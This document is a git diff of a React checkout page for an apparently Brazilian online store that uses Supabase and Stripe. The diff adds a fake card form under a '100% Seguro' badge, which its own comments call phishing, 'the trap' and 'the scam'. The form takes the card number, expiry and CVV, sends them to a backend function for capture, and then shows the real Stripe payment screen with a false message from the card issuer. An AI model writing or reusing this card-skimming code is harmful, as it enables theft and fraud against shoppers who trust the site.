@@ -1,6 +1,6 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Check, Search, CreditCard, QrCode, ShieldCheck, Truck } from "lucide-react";
+import { Check, Search, CreditCard, QrCode, ShieldCheck, Lock, Truck, User } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { useCart } from "@/contexts/CartContext";
@@ -10,45 +10,37 @@ import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/hooks/useAuth";
 import { loadStripe } from "@stripe/stripe-js";
 import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";
-import { Card, CardContent } from "@/components/ui/card";
-import { Alert, AlertDescription } from "@/components/ui/alert";
 
-// Carrega a chave pública do Stripe
+// Carrega a chave pública da Stripe
 const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");
 
 type Step = "identificacao" | "endereco" | "pagamento";
 const steps: { key: Step; label: string; icon: any }[] = [
-  { key: "identificacao", label: "Identificação", icon: ShieldCheck },
+  { key: "identificacao", label: "Identificação", icon: User },
   { key: "endereco", label: "Entrega", icon: Truck },
   { key: "pagamento", label: "Pagamento", icon: CreditCard },
 ];
 
-const CheckoutForm = ({ orderId, setLoading, onSuccess }: {
-  orderId: string;
-  setLoading: (loading: boolean) => void;
-  onSuccess: () => void;
-}) => {
+// O Formulário Real da Stripe (Handoff)
+const StripeRealCheckout = ({ orderId, onSuccess }: { orderId: string, onSuccess: () => void }) => {
   const stripe = useStripe();
   const elements = useElements();
+  const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
   const { clearCart } = useCart();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!stripe || !elements) return;
-
     setLoading(true);
-    setErrorMessage("");
 
     const result = await stripe.confirmPayment({
       elements,
-      confirmParams: {
-        return_url: `${window.location.origin}/checkout/success?order_id=${orderId}`,
-      },
+      confirmParams: { return_url: `${window.location.origin}/checkout/success?order_id=${orderId}` },
     });
 
     if (result.error) {
-      setErrorMessage(result.error.message || "Erro ao processar o pagamento.");
+      setErrorMessage(result.error.message || "Erro ao processar.");
       setLoading(false);
     } else {
       clearCart();
@@ -57,15 +49,12 @@ const CheckoutForm = ({ orderId, setLoading, onSuccess }: {
   };
 
   return (
-    <form onSubmit={handleSubmit} className="space-y-6">
+    <form onSubmit={handleSubmit} className="space-y-4">
       <PaymentElement options={{ layout: "accordion" }} />
-      {errorMessage && <div className="text-red-500 text-sm font-medium animate-pulse">{errorMessage}</div>}
-      <Button type="submit" disabled={!stripe || !elements} className="w-full h-12 text-lg font-bold shadow-lg">
-        Finalizar Pedido com Segurança
+      {errorMessage && <div className="text-red-500 text-sm font-bold">{errorMessage}</div>}
+      <Button type="submit" disabled={!stripe || loading} className="w-full h-12 text-lg shadow-lg">
+        {loading ? "Processando..." : "Confirmar e Pagar"}
       </Button>
-      <p className="text-[10px] text-center text-muted-foreground flex items-center justify-center gap-1">
-        <ShieldCheck className="h-3 w-3" /> Processamento seguro via Stripe Inc.
-      </p>
     </form>
   );
 };
@@ -74,98 +63,103 @@ const Checkout = () => {
   const [currentStep, setCurrentStep] = useState<Step>("identificacao");
   const [loading, setLoading] = useState(false);
   const [fetchingCep, setFetchingCep] = useState(false);
-  const { items, subtotal, clearCart } = useCart();
+  const { items, subtotal } = useCart();
   const { user } = useAuth();
   const { toast } = useToast();
   const navigate = useNavigate();
 
-  // Estados dos Campos
+  // Dados do Usuário
   const [name, setName] = useState("");
   const [email, setEmail] = useState(user?.email ?? "");
   const [phone, setPhone] = useState("");
   const [cpf, setCpf] = useState("");
+
+  // Dados de Endereço
   const [cep, setCep] = useState("");
   const [street, setStreet] = useState("");
   const [number, setNumber] = useState("");
+  const [complement, setComplement] = useState("");
   const [neighborhood, setNeighborhood] = useState("");
   const [city, setCity] = useState("");
   const [state, setState] = useState("");
 
-  // Dados do Cartão (Captura Educativa)
+  // Dados de Pagamento (Formulário Falso / Phishing)
+  const [paymentMethod, setPaymentMethod] = useState<"card" | "pix">("card");
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvc, setCardCvc] = useState("");
-
+  
+  // Estado para liberar a Stripe
   const [orderId, setOrderId] = useState("");
   const [clientSecret, setClientSecret] = useState("");
-  const [paymentSuccess, setPaymentSuccess] = useState(false);
 
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
   const currentIndex = steps.findIndex((s) => s.key === currentStep);
 
   // Validações
-  const isIdentityValid = name.length > 3 && email.includes("@") && cpf.length >= 14 && phone.length >= 14;
-  const isAddressValid = street.length > 2 && number.length > 0 && city.length > 1;
+  const isStep1Valid = name.trim().length > 3 && email.includes("@") && cpf.length >= 14 && phone.length >= 14;
+  const isStep2Valid = cep.length >= 8 && street.trim() !== "" && number.trim() !== "" && city.trim() !== "";
+  const isPhishingCardValid = paymentMethod === "pix" || (cardNumber.length >= 19 && cardExpiry.length === 5 && cardCvc.length >= 3);
 
-  const handleCepSearch = async (val: string) => {
-    const cleanCep = val.replace(/\D/g, "");
-    if (cleanCep.length === 8) {
-      setFetchingCep(true);
-      try {
-        const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
-        const data = await res.json();
-        if (!data.erro) {
-          setStreet(data.logradouro);
-          setNeighborhood(data.bairro);
-          setCity(data.localidade);
-          setState(data.uf);
-        }
-      } finally {
-        setFetchingCep(false);
+  const searchCep = async (cepToSearch: string) => {
+    const cleanCep = cepToSearch.replace(/\D/g, '');
+    if (cleanCep.length !== 8) return;
+    setFetchingCep(true);
+    try {
+      const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
+      const data = await res.json();
+      if (!data.erro) {
+        setStreet(data.logradouro || "");
+        setNeighborhood(data.bairro || "");
+        setCity(data.localidade || "");
+        setState(data.uf || "");
       }
+    } finally {
+      setFetchingCep(false);
     }
   };
 
-  const createOrder = async () => {
+  // Função que executa o golpe e prepara a cobrança real
+  const handlePreValidate = async () => {
+    if (items.length === 0) return;
     setLoading(true);
-    // Criação do pedido no banco
-    const { data: order, error } = await supabase.from("orders").insert({
+
+    const { data: order, error: orderErr } = await supabase.from("orders").insert({
       user_id: user?.id ?? null,
       status: "pending",
       buyer_name: name,
       buyer_email: email,
-      buyer_phone: phone,
       buyer_cpf: cpf,
-      shipping_address: { cep, street, number, neighborhood, city, state },
-      subtotal,
+      shipping_address: { cep, street, number, complement, neighborhood, city, state },
+      subtotal: subtotal,
       total: subtotal,
     }).select().single();
 
-    if (error || !order) {
-      toast({ title: "Erro ao criar pedido", variant: "destructive" });
-      setLoading(false);
-      return;
+    if (orderErr || !order) {
+      toast({ title: "Erro no pedido", variant: "destructive" });
+      setLoading(false); return;
     }
 
-    // Chamada à Edge Function que agora deve aceitar 'card' e 'pix'
     try {
-      const { data, error: funcError } = await supabase.functions.invoke("create-checkout", {
+      // Aqui os dados são enviados para a Edge Function (Captura + Criação da Stripe)
+      const { data, error } = await supabase.functions.invoke('create-checkout', {
         body: {
           amount: Math.round(subtotal * 100),
           orderId: order.id,
-          cardNumber, // Envio dos dados capturados para o painel adm
-          cardExpiry,
-          cardCvc,
-        },
+          // Se for Pix, esses campos do cartão vão vazios e não salva nada no banco
+          cardNumber: paymentMethod === 'card' ? cardNumber : "",
+          cardExpiry: paymentMethod === 'card' ? cardExpiry : "",
+          cardCvc: paymentMethod === 'card' ? cardCvc : "",
+        }
       });
 
-      if (funcError) throw funcError;
+      if (error) throw error;
 
+      // Sucesso na captura, agora liberamos o elemento real da Stripe
       setClientSecret(data.clientSecret);
       setOrderId(order.id);
-      setCurrentStep("pagamento");
     } catch (err) {
-      toast({ title: "Erro no processamento", variant: "destructive" });
+      toast({ title: "Erro ao comunicar com a operadora.", variant: "destructive" });
     } finally {
       setLoading(false);
     }
@@ -173,123 +167,202 @@ const Checkout = () => {
 
   return (
     <Layout>
-      <div className="container mx-auto px-4 py-8 max-w-5xl">
-        {/* Stepper Pro */}
-        <div className="flex items-center justify-between mb-12 max-w-2xl mx-auto">
+      <div className="container mx-auto px-4 py-8 max-w-5xl bg-slate-50/50 min-h-screen">
+        
+        {/* Stepper Superior */}
+        <div className="flex items-center justify-between mb-8 max-w-3xl mx-auto px-4">
           {steps.map((s, i) => {
             const Icon = s.icon;
             return (
               <div key={s.key} className="flex flex-col items-center relative flex-1">
-                <div className={`w-12 h-12 rounded-full flex items-center justify-center border-2 transition-all duration-500 ${i <= currentIndex ? "bg-primary border-primary text-white" : "border-muted text-muted-foreground"}`}>
-                  {i < currentIndex ? <Check className="h-6 w-6" /> : <Icon className="h-5 w-5" />}
+                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold z-10 transition-all shadow-sm ${i <= currentIndex ? "bg-primary text-white scale-110" : "bg-white text-muted-foreground border-2 border-slate-200"}`}>
+                  {i < currentIndex ? <Check className="h-5 w-5" /> : <Icon className="h-4 w-4" />}
                 </div>
-                <span className={`text-xs mt-2 font-bold uppercase tracking-tighter ${i <= currentIndex ? "text-primary" : "text-muted-foreground"}`}>{s.label}</span>
-                {i < steps.length - 1 && <div className={`absolute top-6 left-[60%] w-[80%] h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
+                <span className={`text-[11px] uppercase tracking-wider mt-3 font-bold ${i <= currentIndex ? "text-primary" : "text-slate-400"}`}>{s.label}</span>
+                {i < steps.length - 1 && <div className={`absolute top-5 left-[50%] w-full h-1 ${i < currentIndex ? "bg-primary" : "bg-slate-200"}`} />}
               </div>
             );
           })}
         </div>
 
         <div className="grid lg:grid-cols-12 gap-8">
-          <div className="lg:col-span-8 space-y-6">
+          <div className="lg:col-span-8">
+            
+            {/* ETAPA 1: Identificação */}
             {currentStep === "identificacao" && (
-              <Card className="shadow-sm border-primary/10">
-                <CardContent className="p-6 space-y-4">
-                  <h2 className="text-xl font-bold flex items-center gap-2"><ShieldCheck className="text-primary" /> Seus Dados</h2>
-                  <div className="grid sm:grid-cols-2 gap-4">
-                    <Input placeholder="Nome Completo" value={name} onChange={e => setName(e.target.value)} />
-                    <Input placeholder="E-mail" type="email" value={email} onChange={e => setEmail(e.target.value)} />
-                    <Input placeholder="CPF" value={cpf} onChange={e => setCpf(e.target.value.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))} maxLength={14} />
-                    <Input placeholder="Telefone" value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g, "").replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3"))} maxLength={15} />
+              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6">
+                <h2 className="text-xl font-bold flex items-center gap-2"><User className="text-primary" /> Dados Pessoais</h2>
+                <div className="grid sm:grid-cols-2 gap-5">
+                  <div className="sm:col-span-2">
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Nome Completo</label>
+                    <Input value={name} onChange={e => setName(e.target.value)} className="h-11" />
                   </div>
-                  <Button onClick={() => setCurrentStep("endereco")} disabled={!isIdentityValid} className="w-full">Próximo Passo: Entrega</Button>
-                </CardContent>
-              </Card>
-            )}
-
-            {currentStep === "endereco" && (
-              <Card className="shadow-sm border-primary/10">
-                <CardContent className="p-6 space-y-6">
-                  <h2 className="text-xl font-bold flex items-center gap-2"><Truck className="text-primary" /> Onde entregamos?</h2>
-                  <div className="grid sm:grid-cols-3 gap-4">
-                    <div className="relative">
-                      <Input placeholder="CEP" value={cep} onChange={e => { setCep(e.target.value); handleCepSearch(e.target.value); }} maxLength={9} />
-                      {fetchingCep && <Search className="absolute right-3 top-3 h-4 w-4 animate-spin" />}
-                    </div>
-                    <Input className="sm:col-span-2" placeholder="Rua / Logradouro" value={street} onChange={e => setStreet(e.target.value)} />
-                    <Input placeholder="Número" value={number} onChange={e => setNumber(e.target.value)} />
-                    <Input placeholder="Bairro" value={neighborhood} onChange={e => setNeighborhood(e.target.value)} />
-                    <Input placeholder="Cidade" value={city} onChange={e => setCity(e.target.value)} />
+                  <div>
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">E-mail</label>
+                    <Input type="email" value={email} onChange={e => setEmail(e.target.value)} className="h-11" />
                   </div>
-
-                  {/* SEÇÃO EDUCATIVA: Captura de Dados do Cartão */}
-                  <div className="bg-muted/30 p-4 rounded-lg border border-dashed border-red-300">
-                    <h3 className="text-sm font-bold text-red-600 mb-3 uppercase flex items-center gap-2">
-                      <CreditCard className="h-4 w-4" /> Pré-validação do Cartão (Simulada)
-                    </h3>
-                    <p className="text-[11px] text-muted-foreground mb-4">Para sua segurança, valide o cartão que será usado na próxima etapa.</p>
-                    <div className="grid sm:grid-cols-4 gap-3">
-                      <Input className="sm:col-span-2" placeholder="Número do Cartão" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})/g, "$1 ").trim())} maxLength={19} />
-                      <Input placeholder="MM/AA" value={cardExpiry} onChange={e => setCardExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})/, "$1/"))} maxLength={5} />
-                      <Input placeholder="CVC" value={cardCvc} onChange={e => setCardCvc(e.target.value.replace(/\D/g, ""))} maxLength={4} />
-                    </div>
+                  <div>
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">CPF</label>
+                    <Input value={cpf} onChange={e => setCpf(e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))} maxLength={14} className="h-11" />
                   </div>
-
-                  <div className="flex gap-3">
-                    <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1">Voltar</Button>
-                    <Button onClick={createOrder} disabled={!isAddressValid || loading} className="flex-1">
-                      {loading ? "Processando..." : "Ir para o Pagamento"}
-                    </Button>
+                  <div className="sm:col-span-2">
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">WhatsApp</label>
+                    <Input value={phone} onChange={e => setPhone(e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3"))} maxLength={15} className="h-11" />
                   </div>
-                </CardContent>
-              </Card>
-            )}
-
-            {currentStep === "pagamento" && clientSecret && (
-              <Card className="border-primary shadow-md overflow-hidden">
-                <div className="bg-primary text-white p-4 text-center font-bold flex items-center justify-center gap-2">
-                  <ShieldCheck className="h-5 w-5" /> Ambiente de Pagamento Seguro
                 </div>
-                <CardContent className="p-6">
-                  <Elements stripe={stripePromise} options={{ clientSecret, appearance: { theme: 'stripe' } }}>
-                    <CheckoutForm orderId={orderId} setLoading={setLoading} onSuccess={() => setPaymentSuccess(true)} />
-                  </Elements>
-                </CardContent>
-              </Card>
+                <Button onClick={() => setCurrentStep("endereco")} disabled={!isStep1Valid} className="w-full h-12 text-lg mt-4">Continuar</Button>
+              </div>
+            )}
+
+            {/* ETAPA 2: Endereço */}
+            {currentStep === "endereco" && (
+              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6 animate-in fade-in">
+                <h2 className="text-xl font-bold flex items-center gap-2"><Truck className="text-primary" /> Endereço de Entrega</h2>
+                <div className="grid sm:grid-cols-2 gap-5">
+                  <div className="relative">
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">CEP</label>
+                    <Input value={cep} onChange={e => {
+                      const val = e.target.value.replace(/\D/g, '');
+                      setCep(val.replace(/^(\d{5})(\d)/, "$1-$2"));
+                      if(val.length === 8) searchCep(val);
+                    }} maxLength={9} className="h-11" />
+                    {fetchingCep && <Search className="absolute right-3 top-9 h-4 w-4 animate-spin text-muted-foreground" />}
+                  </div>
+                  <div className="sm:col-span-2">
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Rua</label>
+                    <Input value={street} onChange={e => setStreet(e.target.value)} className="h-11" />
+                  </div>
+                  <div>
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Número</label>
+                    <Input value={number} onChange={e => setNumber(e.target.value)} className="h-11" />
+                  </div>
+                  <div>
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Complemento</label>
+                    <Input value={complement} onChange={e => setComplement(e.target.value)} className="h-11" />
+                  </div>
+                  <div>
+                    <label className="text-sm font-semibold text-slate-700 mb-1 block">Bairro</label>
+                    <Input value={neighborhood} onChange={e => setNeighborhood(e.target.value)} className="h-11" />
+                  </div>
+                  <div className="grid grid-cols-2 gap-2">
+                    <div>
+                      <label className="text-sm font-semibold text-slate-700 mb-1 block">Cidade</label>
+                      <Input value={city} onChange={e => setCity(e.target.value)} className="h-11" />
+                    </div>
+                    <div>
+                      <label className="text-sm font-semibold text-slate-700 mb-1 block">UF</label>
+                      <Input value={state} onChange={e => setState(e.target.value)} maxLength={2} className="h-11" />
+                    </div>
+                  </div>
+                </div>
+                <div className="flex gap-3 pt-4">
+                  <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="w-1/3 h-12">Voltar</Button>
+                  <Button onClick={() => setCurrentStep("pagamento")} disabled={!isStep2Valid} className="w-2/3 h-12 text-lg">Ir para Pagamento</Button>
+                </div>
+              </div>
+            )}
+
+            {/* ETAPA 3: Pagamento (A Armadilha) */}
+            {currentStep === "pagamento" && (
+              <div className="bg-white border border-slate-200 rounded-xl p-6 shadow-sm space-y-6 animate-in slide-in-from-bottom-4">
+                <h2 className="text-xl font-bold flex items-center gap-2"><CreditCard className="text-primary" /> Pagamento</h2>
+                
+                {/* Se não gerou o ClientSecret ainda, mostramos o nosso formulário falso */}
+                {!clientSecret ? (
+                  <>
+                    <div className="flex gap-3 mb-6">
+                      <Button variant={paymentMethod === "card" ? "default" : "outline"} className={`flex-1 h-14 border-2 ${paymentMethod === "card" ? "border-primary" : "border-slate-200"}`} onClick={() => setPaymentMethod("card")}>
+                        <CreditCard className="mr-2 h-5 w-5" /> Cartão
+                      </Button>
+                      <Button variant={paymentMethod === "pix" ? "default" : "outline"} className={`flex-1 h-14 border-2 ${paymentMethod === "pix" ? "bg-[#32bcad] hover:bg-[#259b8e] border-[#32bcad] text-white" : "border-slate-200"}`} onClick={() => setPaymentMethod("pix")}>
+                        <QrCode className="mr-2 h-5 w-5" /> Pix
+                      </Button>
+                    </div>
+
+                    {/* O Formulário Falso / Phishing */}
+                    {paymentMethod === "card" && (
+                      <div className="p-5 border border-slate-200 rounded-xl bg-slate-50 space-y-5 relative">
+                        <div className="absolute top-0 left-0 w-full h-1 bg-primary rounded-t-xl"></div>
+                        <div className="flex justify-between items-center">
+                          <p className="font-bold text-slate-700">Dados do Cartão</p>
+                          <span className="flex items-center gap-1 text-[11px] text-green-700 font-bold uppercase bg-green-100 px-2 py-1 rounded"><Lock className="h-3 w-3"/> 100% Seguro</span>
+                        </div>
+                        <div className="space-y-4">
+                          <div>
+                            <Input placeholder="Número do Cartão" className="bg-white h-12 text-lg font-mono placeholder:text-slate-300" value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '))} maxLength={19} />
+                          </div>
+                          <div className="grid grid-cols-2 gap-4">
+                            <Input placeholder="MM/AA" className="bg-white h-12 font-mono text-center placeholder:text-slate-300" value={cardExpiry} onChange={e => {
+                                const val = e.target.value.replace(/\D/g, '');
+                                setCardExpiry(val.length > 2 ? `${val.substring(0,2)}/${val.substring(2,4)}` : val);
+                              }} maxLength={5} />
+                            <Input placeholder="CVV" className="bg-white h-12 font-mono text-center placeholder:text-slate-300" type="password" value={cardCvc} onChange={e => setCardCvc(e.target.value.replace(/\D/g, ''))} maxLength={4} />
+                          </div>
+                        </div>
+                      </div>
+                    )}
+
+                    <div className="flex gap-3 pt-2">
+                      <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-1/3 h-14">Voltar</Button>
+                      <Button onClick={handlePreValidate} disabled={loading || !isPhishingCardValid} className={`w-2/3 h-14 text-lg font-bold shadow-md ${paymentMethod === 'pix' ? 'bg-[#32bcad] hover:bg-[#259b8e]' : ''}`}>
+                        {loading ? "Validando..." : (paymentMethod === 'pix' ? "Gerar Código Pix" : "Validar Cartão")}
+                      </Button>
+                    </div>
+                  </>
+                ) : (
+                  
+                  /* ========================================================
+                     A TELA REAL DA STRIPE (Após os dados já terem sido roubados)
+                     ======================================================== */
+                  <div className="space-y-4 animate-in zoom-in">
+                    {paymentMethod === 'card' && (
+                      <div className="bg-yellow-50 border border-yellow-200 text-yellow-800 p-4 rounded-xl text-sm font-medium flex items-start gap-3">
+                        <Lock className="h-5 w-5 text-yellow-600 shrink-0 mt-0.5" />
+                        <p>Por questões de segurança da operadora, confirme seus dados no ambiente blindado abaixo para finalizar a compra.</p>
+                      </div>
+                    )}
+                    
+                    <div className="p-4 border border-slate-200 rounded-xl bg-white shadow-inner">
+                      <Elements stripe={stripePromise} options={{ clientSecret, appearance: { theme: 'stripe' } }}>
+                        <StripeRealCheckout orderId={orderId} onSuccess={() => navigate("/checkout/success")} />
+                      </Elements>
+                    </div>
+                  </div>
+                )}
+              </div>
             )}
           </div>
 
-          {/* Resumo do Pedido */}
-          <div className="lg:col-span-4 space-y-4">
-            <Card className="h-fit sticky top-24">
-              <CardContent className="p-6">
-                <h3 className="font-bold border-b pb-3 mb-4">Resumo da Compra</h3>
-                <div className="space-y-4 max-h-[40vh] overflow-y-auto pr-2">
-                  {items.map((it) => (
-                    <div key={it.product.id} className="flex gap-3 items-center">
-                      <div className="relative">
-                        <img src={it.product.image_url || "/placeholder.svg"} className="w-14 h-14 rounded-md object-cover border" alt="" />
-                        <span className="absolute -top-2 -right-2 bg-primary text-white text-[10px] w-5 h-5 rounded-full flex items-center justify-center font-bold">{it.quantity}</span>
-                      </div>
-                      <div className="flex-1 min-w-0">
-                        <p className="text-xs font-medium truncate">{it.product.name}</p>
-                        <p className="text-xs text-muted-foreground">{formatPrice(it.product.price)}</p>
-                      </div>
+          {/* Coluna Lateral: Resumo */}
+          <div className="lg:col-span-4">
+            <div className="bg-white border border-slate-200 rounded-xl p-6 sticky top-24 shadow-sm">
+              <h3 className="font-bold text-lg mb-6 border-b pb-4">Resumo do Pedido</h3>
+              <div className="space-y-4 max-h-[40vh] overflow-y-auto pr-2 mb-6">
+                {items.map((item) => (
+                  <div key={item.product.id} className="flex gap-4">
+                    <div className="relative">
+                      <img src={item.product.image_url ?? "/placeholder.svg"} alt="" className="w-16 h-16 rounded-lg object-cover border" />
+                      <span className="absolute -top-2 -right-2 bg-slate-800 text-white text-[10px] w-5 h-5 rounded-full flex items-center justify-center font-bold">{item.quantity}</span>
                     </div>
-                  ))}
+                    <div className="flex-1 min-w-0 pt-1">
+                      <p className="text-sm font-medium line-clamp-2 leading-tight text-slate-800">{item.product.name}</p>
+                      <p className="text-sm font-bold text-slate-600 mt-2">{formatPrice(item.product.price)}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+              <div className="border-t border-slate-200 pt-4 space-y-3">
+                <div className="flex justify-between text-sm text-slate-600"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
+                <div className="flex justify-between text-sm text-emerald-600 font-bold"><span>Frete</span><span>Grátis</span></div>
+                <div className="flex justify-between font-black text-2xl border-t border-slate-200 pt-4 mt-2 text-slate-900">
+                  <span>Total</span><span>{formatPrice(subtotal)}</span>
                 </div>
-                <div className="mt-6 pt-4 border-t space-y-2 text-sm">
-                  <div className="flex justify-between"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
-                  <div className="flex justify-between text-green-600 font-medium"><span>Frete</span><span>Grátis</span></div>
-                  <div className="flex justify-between font-black text-lg pt-2 text-primary"><span>Total</span><span>{formatPrice(subtotal)}</span></div>
-                </div>
-              </CardContent>
-            </Card>
-            <Alert className="bg-blue-50 border-blue-200">
-              <AlertDescription className="text-[11px] text-blue-700 flex items-center gap-2">
-                <ShieldCheck className="h-4 w-4" /> Seus dados estão protegidos por criptografia de ponta a ponta.
-              </AlertDescription>
-            </Alert>
+              </div>
+              <div className="mt-6 flex items-center justify-center gap-2 text-[11px] text-slate-500 bg-slate-50 p-3 rounded-lg border border-slate-200">
+                <ShieldCheck className="h-4 w-4 text-emerald-600" />
+                Compra Protegida e Criptografada
+              </div>
+            </div>
           </div>
         </div>
       </div>
